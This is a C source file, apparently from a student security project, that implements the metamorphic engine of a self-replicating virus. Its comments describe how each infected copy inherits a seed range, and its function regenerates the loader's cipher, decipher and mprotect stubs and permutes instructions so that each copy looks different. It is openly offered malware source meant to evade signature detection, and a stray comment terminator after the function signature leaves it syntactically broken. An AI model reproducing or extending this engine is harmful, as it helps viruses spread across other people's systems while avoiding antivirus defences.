/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph_self.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
/*   Updated: 2019/12/16 23:34:28 by nhaquet          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "polymorphism.h"
#include "errors.h"

/*
** metamorph_self is a metamorphic generator for the virus loader.
**   It works by regenerating its own loader
**   (overwriting the one that is loaded in memory)
**   before it is copied by our virus later on.
**
**   The uint64_t seed[2] is the range of seeds that belongs to our virus.
**   seed[0] is the seed of the current virus.
**   seed[1] is the last seed that belongs to the current virus.
**   All the numbers that aren't in this range are owned by other UNIQUE copies
**   of this virus.
**
**   When a new virus is bred, the parent gives away a part of his seed range
**   to his child, losing ownership of the range given.
**
**   (1)    father[n, m]
**   (2)    father infects son
**   (3)    father[n, p] and son[p + 1, m] with n < p < m
**
*/

void		return_to_client(void);

bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2])*/
{
	size_t cypher_size   = (size_t)cypher_end - (size_t)cypher;
	size_t mprotect_size = (size_t)mprotect_end - (size_t)mprotect_call;
	size_t	loader_size  = return_to_client - famine_entry; // tmp size

	if (!yield_seed_to_heir(seed, son_seed)
	|| !generate_cypher((void *)cypher, son_seed[0], cypher_size)
	|| !generate_decypher((void *)decypher, son_seed[0], cypher_size)
	|| !generate_mprotect((void *)mprotect_call, son_seed[0], mprotect_size)
	|| !permutate_instructions(famine_entry, loader_size)
	|| !true) // add more metamorphosis above!
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
	return true;
}
